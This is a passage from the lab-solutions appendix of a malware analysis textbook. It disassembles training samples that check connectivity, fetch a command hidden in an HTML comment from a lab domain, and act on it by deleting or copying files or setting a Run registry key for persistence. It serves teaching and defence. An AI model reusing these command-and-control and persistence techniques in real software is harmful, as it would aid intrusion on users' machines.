- en: '**Script File** and selecting the Python script, shown in the following listing.'
  prefs: []
  type: TYPE_NORMAL
- en: '**500**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: sea = ScreenEA() 
  prefs: []
  type: TYPE_NORMAL
- en: 'for i in range(0x00,0x50):'
  prefs: []
  type: TYPE_NORMAL
- en: b = **Byte**(sea+i)
  prefs: []
  type: TYPE_NORMAL
- en: decoded_byte = b ^ 0x55 
  prefs: []
  type: TYPE_NORMAL
- en: '**PatchByte**(sea+i,decoded_byte)'
  prefs: []
  type: TYPE_NORMAL
- en: At , the script grabs the current location of the cursor, for use as an offset
    to decode the data. Next, it loops from 0 to 0x50 and grabs the value of each
    byte using the call to Byte. It takes each byte and XORs it with 0x55
  prefs: []
  type: TYPE_NORMAL
- en: '**6**'
  prefs: []
  type: TYPE_NORMAL
- en: at . Finally, it patches the byte in the IDA Pro display without modifying
    the original file. You can easily customize this script for your own use.
  prefs: []
  type: TYPE_NORMAL
- en: After the script runs, we see that the data at 0x1001D988 has been changed to
    something more readable. We can turn this into an ASCII string by pressing the
    A key on the keyboard with the cursor at 0x1001D988\. This reveals the string
    xdoor is this backdoor, string decoded for Practical Malware Analysis Lab :)1234\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 6-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The major code construct is an if statement located at 0x401000\.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: printf is the subroutine located at 0x40105F.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The program checks for an active Internet connection. If an active connection
    is found, it prints “Success: Internet Connection.” If a connection is not found,
    it prints “Error 1.1: No Internet.” This program can be used by malware to check
    for a connection before attempting to connect to the Internet.'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin by performing basic static analysis on this executable. Looking at
    the imports, we see that the DLL *WININET.dll* and the function InternetGetConnectedState
    are imported. The Windows Internet (WinINet) API enables applications to interact
    with HTTP protocols to access Internet resources.
  prefs: []
  type: TYPE_NORMAL
- en: 'Using MSDN, we learn this Windows API function checks the status of the Internet
    connection for the local system. The strings Error 1.1: No Internet and Success:
    Internet Connection hint that this program may check for an active Internet connection
    on the system.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we perform basic dynamic analysis on this executable. Nothing overly exciting
    happens when this executable is run from the command line.
  prefs: []
  type: TYPE_NORMAL
- en: 'It simply prints “Success: Internet Connection” and then terminates.'
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we load the file into IDA Pro for full analysis. Much of this disassembly
    is generated by the compiler, so we need to be careful to avoid going down rabbit
    holes of irrelevant code. Therefore, we start from the main function, which is
    typically where the code written by the malware author begins.
  prefs: []
  type: TYPE_NORMAL
- en: In this case, the main function starts at 0x401040\. The main function calls
    the Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**501**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: function at 0x401000, which appears to be a key function of interest because
    it is the only one called by main. Figure 6-1L shows a flow graph of this function.
  prefs: []
  type: TYPE_NORMAL
- en: 'sub_401000:'
  prefs: []
  type: TYPE_NORMAL
- en: push ebp
  prefs: []
  type: TYPE_NORMAL
- en: mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: push ecx
  prefs: []
  type: TYPE_NORMAL
- en: push 0
  prefs: []
  type: TYPE_NORMAL
- en: push 0
  prefs: []
  type: TYPE_NORMAL
- en: call ds:InternetGetConnectedState
  prefs: []
  type: TYPE_NORMAL
- en: mov [ebp+var_4], eax
  prefs: []
  type: TYPE_NORMAL
- en: cmp [ebp+var_4], 0
  prefs: []
  type: TYPE_NORMAL
- en: jz short loc_40102B
  prefs: []
  type: TYPE_NORMAL
- en: 'false'
  prefs: []
  type: TYPE_NORMAL
- en: 'true'
  prefs: []
  type: TYPE_NORMAL
- en: '00401017:'
  prefs: []
  type: TYPE_NORMAL
- en: 'push offset aSuccessInterne ; "Success: Internet Connection\n"'
  prefs: []
  type: TYPE_NORMAL
- en: call printf
  prefs: []
  type: TYPE_NORMAL
- en: add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, 1
  prefs: []
  type: TYPE_NORMAL
- en: jmp short loc_40103A
  prefs: []
  type: TYPE_NORMAL
- en: 'loc_40102B:'
  prefs: []
  type: TYPE_NORMAL
- en: 'push offset aError1_1NoInte; "Error 1.1: No Internet\n"'
  prefs: []
  type: TYPE_NORMAL
- en: call printf
  prefs: []
  type: TYPE_NORMAL
- en: add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 'loc_40103A:'
  prefs: []
  type: TYPE_NORMAL
- en: mov esp, ebp
  prefs: []
  type: TYPE_NORMAL
- en: pop ebp
  prefs: []
  type: TYPE_NORMAL
- en: retn
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 6-1L: Disassembly flow graph of the function at 0x401000*'
  prefs: []
  type: TYPE_NORMAL
- en: Now we graph this function in IDA Pro using **View****Graphs****Flow chart**.
  prefs: []
  type: TYPE_NORMAL
- en: 'Looking at this graph and code, we see a common code construct: two different
    code paths depend on the result of the call to InternetGetConnectedState.'
  prefs: []
  type: TYPE_NORMAL
- en: The cmp instruction is used to compare the result contained in EAX to 0, and
    then the jz instruction is used to control the flow.
  prefs: []
  type: TYPE_NORMAL
- en: The MSDN page on InternetGetConnectedState further states that the function
    returns 1 if there is an active Internet connection; otherwise it returns 0\.
  prefs: []
  type: TYPE_NORMAL
- en: Therefore, the code will take the false branch at  if the result is 0 because
    the zero flag (ZF) will be clear; otherwise, it will take the true branch at .
  prefs: []
  type: TYPE_NORMAL
- en: The code construct used in this function is an if statement.
  prefs: []
  type: TYPE_NORMAL
- en: The function calls the subroutine at 0x40105F in two locations, but if we dive
    into that function, we will quickly get lost in a rabbit hole. This function is
    printf. Surprisingly, both the IDA Pro commercial and freeware versions will not
    always recognize and label the printf function. Therefore, we must look for certain
    signals that hint at an unlabeled call to printf. One easy way to tell is by identifying
    parameters pushed onto the stack before the call to the subroutine. Here, in both
    cases, a format string is pushed onto the stack.
  prefs: []
  type: TYPE_NORMAL
- en: The \n at the end of a string denotes a line feed. Also, given the context and
    **502**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: the string itself, we can deduce that the function is printf. Therefore, we
    rename the function to printf, so that it is marked as such throughout the code,
    as shown in Figure 6-1L. Once the printf function is called, we see that EAX is
    set to either 1 or 0 before the function returns.
  prefs: []
  type: TYPE_NORMAL
- en: To summarize, this function checks for an active Internet connection, and then
    prints the result of its check, followed by returning a 1 if it is connected and
    0 if it is not. Malware often performs a similar check for a valid Internet connection.
  prefs: []
  type: TYPE_NORMAL
- en: '**6**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 6-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The first subroutine at 0x401000 is the same as in Lab 6-1\. It’s an if statement
    that checks for an active Internet connection.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: printf is the subroutine located at 0x40117F.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The second function called from main is located at 0x401040\. It downloads
    the web page located at: *http://www.practicalmalwareanalysis.com/*'
  prefs: []
  type: TYPE_NORMAL
- en: '*cc.htm* and parses an HTML comment from the beginning of the page.'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: This subroutine uses a character array filled with data from the call to InternetReadFile.
    This array is compared one byte at a time to parse an HTML comment.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: There are two network-based indicators. The program uses the HTTP
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent Internet Explorer 7.5/pma and downloads the web page located at:
    *http://www.practicalmalwareanalysis.com/cc.htm*.'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: First, the program checks for an active Internet connection. If none is found,
    the program terminates. Otherwise, the program attempts to download a web page
    using a unique User-Agent. This web page contains an embedded HTML comment starting
    with <!--. The next character is parsed from this comment and printed to the screen
    in the format
  prefs: []
  type: TYPE_NORMAL
- en: '“Success: Parsed command is *X*,” where *X* is the character parsed from the
    HTML comment. If successful, the program will sleep for 1 minute and then terminate.'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin by performing basic static analysis on the binary. We see several new
    strings of interest, as shown in Listing 6-1L.
  prefs: []
  type: TYPE_NORMAL
- en: 'Error 2.3: Fail to get command'
  prefs: []
  type: TYPE_NORMAL
- en: 'Error 2.2: Fail to ReadFile'
  prefs: []
  type: TYPE_NORMAL
- en: 'Error 2.1: Fail to OpenUrl'
  prefs: []
  type: TYPE_NORMAL
- en: http://www.practicalmalwareanalysis.com/cc.htm
  prefs: []
  type: TYPE_NORMAL
- en: Internet Explorer 7.5/pma
  prefs: []
  type: TYPE_NORMAL
- en: 'Success: Parsed command is %c'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-1L: Interesting new strings contained in Lab 6-2*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**503**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The three error message strings that we see suggest that the program may open
    a web page and parse a command. We also notice a URL for an HTML web page, *http://www.practicalmalwareanalysis.com/cc.htm*.
    This domain can be used immediately as a network-based indicator.
  prefs: []
  type: TYPE_NORMAL
- en: These imports contain several new Windows API functions used for networking,
    as shown in Listing 6-2L.
  prefs: []
  type: TYPE_NORMAL
- en: InternetReadFile
  prefs: []
  type: TYPE_NORMAL
- en: InternetCloseHandle
  prefs: []
  type: TYPE_NORMAL
- en: InternetOpenUrlA
  prefs: []
  type: TYPE_NORMAL
- en: InternetOpenA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-2L: Interesting new import functions contained in Lab 6-2*'
  prefs: []
  type: TYPE_NORMAL
- en: All of these functions are part of WinINet, a simple API for using HTTP
  prefs: []
  type: TYPE_NORMAL
- en: 'over a network. They work as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: InternetOpenA is used to initialize the use of the WinINet library, and it sets
    the User-Agent used for HTTP communication.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: InternetOpenUrlA is used to open a handle to a location specified by a complete
    FTP or HTTP URL. (Programs use handles to access something that has been opened.
    We discuss handles in Chapter 7.)
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: InternetReadFile is used to read data from the handle opened by InternetOpenUrlA.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: InternetCloseHandle is used to close the handles opened by these files.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we perform dynamic analysis. We choose to listen on port 80
  prefs: []
  type: TYPE_NORMAL
- en: because WinINet often uses HTTP and we saw a URL in the strings. If we set up
    Netcat to listen on port 80 and redirect the DNS accordingly, we will see a DNS
    query for *www.practicalmalwareanalysis.com*, after which the program requests
    a web page from the URL, as shown in Listing 6-3L. This tells us that this web
    page has some significance to the malware, but we won’t know what that is until
    we analyze the disassembly.
  prefs: []
  type: TYPE_NORMAL
- en: C:\>nc -l -p 80
  prefs: []
  type: TYPE_NORMAL
- en: GET /cc.htm HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Internet Explorer 7.5/pma'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: www.practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-3L: Netcat output when listening on port 80*'
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we load the executable into IDA Pro. We begin our analysis with the
    main method since much of the other code is generated by the compiler.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the disassembly for main, we notice that it calls the same method
    at 0x401000 that we saw in Lab 6-1\. However, two new calls (401040 and 40117F)
    in the main method were not in Lab 6-1\.
  prefs: []
  type: TYPE_NORMAL
- en: '**504**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'In the new call to 0x40117F, we notice that two parameters are pushed on the
    stack before the call. One parameter is the format string Success: Parsed command
    is %c, and the other is the byte returned from the previous call at 0x401148\.
    Format characters such as %c and %d tell us that we’re looking at a format string.
    Therefore, we can deduce that printf is the subroutine located at 0x40117F, and
    we should rename it as such, so that it’s renamed everywhere it is referenced.
    The printf subroutine will print the string with the %c replaced by the other
    parameter pushed on the stack.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine the new call to 0x401040\. This function contains all of the
    WinINet API calls we discovered during the basic static analysis process. It first
    **6**
  prefs: []
  type: TYPE_NORMAL
- en: calls InternetOpen, which initializes the use of the WinINet library. Notice
    that Internet Explorer 7.5/pma is pushed on the stack, matching the User-Agent
    we noticed during dynamic analysis. The next call is to InternetOpenUrl, which
    opens the static web page pushed onto the stack as a parameter. This function
    caused the DNS request we saw during dynamic analysis.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 6-4L shows the InternetOpenUrlA and the InternetReadFile calls.
  prefs: []
  type: TYPE_NORMAL
- en: 00401070 call ds:**InternetOpenUrlA**
  prefs: []
  type: TYPE_NORMAL
- en: 00401076 mov [ebp+hFile], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401079 cmp [ebp+hFile], 0 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 0040109D lea edx, [ebp+dwNumberOfBytesRead]
  prefs: []
  type: TYPE_NORMAL
- en: 004010A0 push edx ; lpdwNumberOfBytesRead
  prefs: []
  type: TYPE_NORMAL
- en: 004010A1 push 200h ; dwNumberOfBytesToRead
  prefs: []
  type: TYPE_NORMAL
- en: 004010A6 lea eax, [ebp+Buffer ]
  prefs: []
  type: TYPE_NORMAL
- en: 004010AC push eax ; lpBuffer
  prefs: []
  type: TYPE_NORMAL
- en: 004010AD mov ecx, [ebp+hFile]
  prefs: []
  type: TYPE_NORMAL
- en: 004010B0 push ecx ; hFile
  prefs: []
  type: TYPE_NORMAL
- en: 004010B1 call ds:**InternetReadFile**
  prefs: []
  type: TYPE_NORMAL
- en: 004010B7 mov [ebp+var_4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 004010BA cmp [ebp+var_4], 0 
  prefs: []
  type: TYPE_NORMAL
- en: 004010BE jnz short loc_4010E5
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-4L: InternetOpenUrlA and InternetReadFile calls* We can see that
    the return value from InternetOpenUrlA is moved into the local variable hFile
    and compared to 0 at . If it is 0, this function will be terminated; otherwise,
    the hFile variable will be passed to the next function, InternetReadFile. The
    hFile variable is a handle—a way to access something that has been opened. This
    handle is accessing a URL.'
  prefs: []
  type: TYPE_NORMAL
- en: InternetReadFile is used to read the web page opened by InternetOpenUrlA.
  prefs: []
  type: TYPE_NORMAL
- en: If we read the MSDN page on this API function, we can learn about the other
    parameters. The most important of these parameters is the second one, which IDA
    Pro has labels Buffer, as shown at . Buffer is an array of data, and in this
    case, we will be reading up to 0x200 bytes worth of data, as shown by the NumberOfBytesToRead
    parameter at . Since we know that this function is reading an HTML web page,
    we can think of Buffer as an array of characters.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**505**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Following the call to InternetReadFile, code at  checks to see if the return
    value (EAX) is 0\. If it is 0, the function closes the handles and terminates;
    if not, the code immediately following this line compares Buffer one character
    at a time, as shown in Listing 6-5L. Notice that each time, the index into Buffer
    goes up by 1 before it is moved into a register, and then compared.
  prefs: []
  type: TYPE_NORMAL
- en: 004010E5 movsx ecx, byte ptr [ebp+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 004010EC cmp ecx, 3Ch 
  prefs: []
  type: TYPE_NORMAL
- en: 004010EF jnz short loc_40111D
  prefs: []
  type: TYPE_NORMAL
- en: 004010F1 movsx edx, byte ptr [ebp+Buffer+1] 
  prefs: []
  type: TYPE_NORMAL
- en: 004010F8 cmp edx, 21h
  prefs: []
  type: TYPE_NORMAL
- en: 004010FB jnz short loc_40111D
  prefs: []
  type: TYPE_NORMAL
- en: 004010FD movsx eax, byte ptr [ebp+Buffer+2]
  prefs: []
  type: TYPE_NORMAL
- en: 00401104 cmp eax, 2Dh
  prefs: []
  type: TYPE_NORMAL
- en: 00401107 jnz short loc_40111D
  prefs: []
  type: TYPE_NORMAL
- en: 00401109 movsx ecx, byte ptr [ebp+Buffer+3]
  prefs: []
  type: TYPE_NORMAL
- en: 00401110 cmp ecx, 2Dh
  prefs: []
  type: TYPE_NORMAL
- en: 00401113 jnz short loc_40111D
  prefs: []
  type: TYPE_NORMAL
- en: 00401115 mov al, [ebp+var_20C] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040111B jmp short loc_40112C
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-5L: Buffer handling*'
  prefs: []
  type: TYPE_NORMAL
- en: At , the cmp instruction checks to see if the first character is equal to 0x3C,
    which corresponds to the < symbol in ASCII. We can right-click on 3Ch, and IDA
    Pro will offer to change it to display <. In the same way, we can do this throughout
    the listing for 21h, 2Dh, and 2Dh. If we combine the characters, we will have
    the string <!--, which happens to be the start of a comment in HTML. (HTML comments
    are not displayed when viewing web pages in a browser, but you can see them by
    viewing the web page source.) Notice at  that Buffer+1 is moved into EDX before
    it is compared to 0x21 (! in ASCII). Therefore, we can assume that Buffer is an
    array of characters from the web page downloaded by InternetReadFile. Since Buffer
    points to the start of the web page, the four cmp instructions are used to check
    for an HTML comment immediately at the start of the web page. If all comparisons
    are successful, the web page starts with the embedded HTML comment, and the code
    at  is executed. (Unfortunately, IDA Pro fails to realize that the local variable
    Buffer is of size 512 and has displayed a local variable named var_20C instead.)
  prefs: []
  type: TYPE_NORMAL
- en: We need to fix the stack of this function to display a 512-byte array in order
    for the Buffer array to be labeled properly throughout the function.
  prefs: []
  type: TYPE_NORMAL
- en: We can do this by pressing CTRL-K anywhere within the function. For example,
    the left side of Figure 6-2L shows the initial stack view. To fix the stack, we
    right-click on the first byte of Buffer and define an array 1 byte wide and 512
    bytes large. The right side of the figure shows what the corrected stack should
    look like.
  prefs: []
  type: TYPE_NORMAL
- en: Manually adjusting the stack like this will cause the instruction numbered 
    in Listing 6-5L to be displayed as [ebp+Buffer+4]. Therefore, if the first four
    characters (Buffer[0]-Buffer[3]) match <!--, the fifth character will be moved
    into AL and returned from this function.
  prefs: []
  type: TYPE_NORMAL
- en: '**506**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 110](index-540_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 111](index-540_2.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 6-2L: Creating an array and fixing the stack*'
  prefs: []
  type: TYPE_NORMAL
- en: Returning to the main method, let’s analyze what happens after the 0x401040
    function returns. If this function returns a nonzero value, the **6**
  prefs: []
  type: TYPE_NORMAL
- en: 'main method will print as “Success: Parsed command is *X*,” where *X* is the
    character parsed from the HTML comment, followed by a call to the Sleep function
    at 0x401173\. Using MSDN, we learn that the Sleep function takes a single parameter
    containing the number of milliseconds to sleep. It pushes 0xEA60 on the stack,
    which corresponds to sleeping for one minute (60,000'
  prefs: []
  type: TYPE_NORMAL
- en: milliseconds).
  prefs: []
  type: TYPE_NORMAL
- en: To summarize, this program checks for an active Internet connection, and then
    downloads a web page containing the string <!--, the start of a comment in HTML.
    An HTML comment will not be displayed in a web browser, but you can view it by
    looking at the HTML page source. This technique of hiding commands in HTML comments
    is used frequently by attackers to send commands to malware while having the malware
    appear as if it were going to a normal web page.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 6-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The functions at 0x401000 and 0x401040 are the same as those in Lab 6-2\.
  prefs: []
  type: TYPE_NORMAL
- en: At 0x401271 is printf. The 0x401130 function is new to this lab.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The new function takes two parameters. The first is the command character parsed
    from the HTML comment, and the second is the program name argv[0], the standard
    main parameter.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The new function contains a switch statement with a jump table.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The new function can print error messages, delete a file, create a directory,
    set a registry value, copy a file, or sleep for 100 seconds.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The registry key Software\Microsoft\Windows\CurrentVersion\Run\Malware and the
    file location *C:\Temp\cc.exe* can both be host-based indicators.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The program first checks for an active Internet connection. If no Internet connection
    is found, the program terminates. Otherwise, the program will attempt to download
    a web page containing an embedded HTML comment beginning with <!--. The first
    character of the comment is parsed and used in a switch statement to determine
    which action to take on the local system, including whether to delete a file,
    create a directory, set a registry run key, copy a file, or sleep for 100 seconds.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**507**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin by performing basic static analysis on the binary and find several
    new strings of interest, as shown in Listing 6-6L.
  prefs: []
  type: TYPE_NORMAL
- en: 'Error 3.2: Not a valid command provided'
  prefs: []
  type: TYPE_NORMAL
- en: 'Error 3.1: Could not set Registry value'
  prefs: []
  type: TYPE_NORMAL
- en: Malware
  prefs: []
  type: TYPE_NORMAL
- en: Software\Microsoft\Windows\CurrentVersion\Run
  prefs: []
  type: TYPE_NORMAL
- en: C:\Temp\cc.exe
  prefs: []
  type: TYPE_NORMAL
- en: C:\Temp
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-6L: Interesting new strings contained in Lab 6-3*'
  prefs: []
  type: TYPE_NORMAL
- en: These error messages suggest that the program may be able to modify the registry.
    Software\Microsoft\Windows\CurrentVersion\Run is a common autorun location in
    the registry. *C:\Temp\cc.exe* is a directory and filename that may be useful
    as a host-based indicator.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the imports, we see several new Windows API functions not found in
    Lab 6-2, as shown in Listing 6-7L.
  prefs: []
  type: TYPE_NORMAL
- en: DeleteFileA
  prefs: []
  type: TYPE_NORMAL
- en: CopyFileA
  prefs: []
  type: TYPE_NORMAL
- en: CreateDirectoryA
  prefs: []
  type: TYPE_NORMAL
- en: RegOpenKeyExA
  prefs: []
  type: TYPE_NORMAL
- en: RegSetValueExA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-7L: Interesting new import functions contained in Lab 6-3*'
  prefs: []
  type: TYPE_NORMAL
- en: The first three imports are self-explanatory. The RegOpenKeyExA function is
    typically used with RegSetValueExA to insert information into the registry, usually
    when the malware sets itself or another program to start on system boot for the
    sake of persistence. (We discuss the Windows registry in depth in Chapter 7.)
  prefs: []
  type: TYPE_NORMAL
- en: Next, we perform dynamic analysis, but find that it isn’t very fruitful (not
    surprising based on what we discovered in Lab 6-2). We could connect the malware
    directly to the Internet or use INetSim to serve web pages to the malware, but
    we wouldn’t know what to put in the HTML comment. Therefore, we need to perform
    more in-depth analysis by looking at the disassembly.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we load the executable into IDA Pro. The main method looks nearly identical
    to the one from Lab 6-2, except there is an extra call to 0x401130\. The calls
    to 0x401000 (check Internet connection) and 0x401040
  prefs: []
  type: TYPE_NORMAL
- en: (download web page and parse HTML comment) are identical to those in Lab 6-2\.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine the parameters passed to 0x401130\. It looks like argv and
    var_8 are pushed onto the stack before the call. In this case, argv is Argv[0],
    a reference to a string containing the current program’s name, *Lab06-03.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the disassembly, we see that var_8 is set to AL at 0x40122D.
  prefs: []
  type: TYPE_NORMAL
- en: Remember that EAX is the return value from the previous function call, and that
    AL is contained within EAX. In this case, the previous function call **508**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: is 0x401040 (download web page and parse HTML comment). Therefore, var_8 is
    passed to 0x401130 containing the command character parsed from the HTML comment.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know what is passed to the function at 0x401130, we can analyze
    it. Listing 6-8L is from the start of the function.
  prefs: []
  type: TYPE_NORMAL
- en: 00401136 movsx eax, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0040113A mov [ebp+var_8], eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040113D mov ecx, [ebp+var_8] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401140 sub ecx, 61h
  prefs: []
  type: TYPE_NORMAL
- en: '**6**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401143 mov [ebp+var_8], ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401146 cmp [ebp+var_8], 4 
  prefs: []
  type: TYPE_NORMAL
- en: 0040114A ja loc_4011E1
  prefs: []
  type: TYPE_NORMAL
- en: 00401150 mov edx, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 00401153 jmp ds:off_4011F2[edx*4] 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004011F2 off_4011F2 dd offset loc_40115A 
  prefs: []
  type: TYPE_NORMAL
- en: 004011F6 dd offset loc_40116C
  prefs: []
  type: TYPE_NORMAL
- en: 004011FA dd offset loc_40117F
  prefs: []
  type: TYPE_NORMAL
- en: 004011FE dd offset loc_40118C
  prefs: []
  type: TYPE_NORMAL
- en: 00401202 dd offset loc_4011D4
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-8L: Analyzing the function at 0x401130*'
  prefs: []
  type: TYPE_NORMAL
- en: arg_0 is an automatic label from IDA Pro that lists the last parameter pushed
    before the call; therefore, arg_0 is the parsed command character retrieved from
    the Internet. The parsed command character is moved into var_8 and eventually
    loaded into ECX at . The next instruction subtracts 0x61 (the letter *a* in ASCII)
    from ECX. Therefore, once this instruction executes, ECX will equal 0 when arg_0
    is equal to *a*.
  prefs: []
  type: TYPE_NORMAL
- en: Next, a comparison to the number 4 at  checks to see if the command character
    (arg_0) is a, b, c, d, or e. Any other result will force the ja instruction to
    leave this section of code. Otherwise, we see the parsed command character used
    as an index into the jump table at .
  prefs: []
  type: TYPE_NORMAL
- en: The EDX is multiplied by 4 at  because the jump table is a set of memory addresses
    referencing the different possible paths, and each memory address is 4 bytes in
    size. The jump table at  has five entries, as expected. A jump table like this
    is often used by a compiler when generating assembly for a switch statement, as
    described in Chapter 6\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Graphical View of Command Character Switch**'
  prefs: []
  type: TYPE_NORMAL
- en: Now let’s look at the graphical view of this function, as shown in Figure 6-3L.
  prefs: []
  type: TYPE_NORMAL
- en: We see six possible paths through the code, including five cases and the default.
    The “jump above 4” instruction takes us down the default path; otherwise, the
    jump table causes an execution path of the a through e branches. When you see
    a graph like the one in the figure (a single box going to many different boxes),
    you should suspect a switch statement. You can confirm that suspicion by looking
    at the code logic and jump table.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**509**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 112](index-543_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 6-3L: The switch statement from function 0x401130 shown in graphical
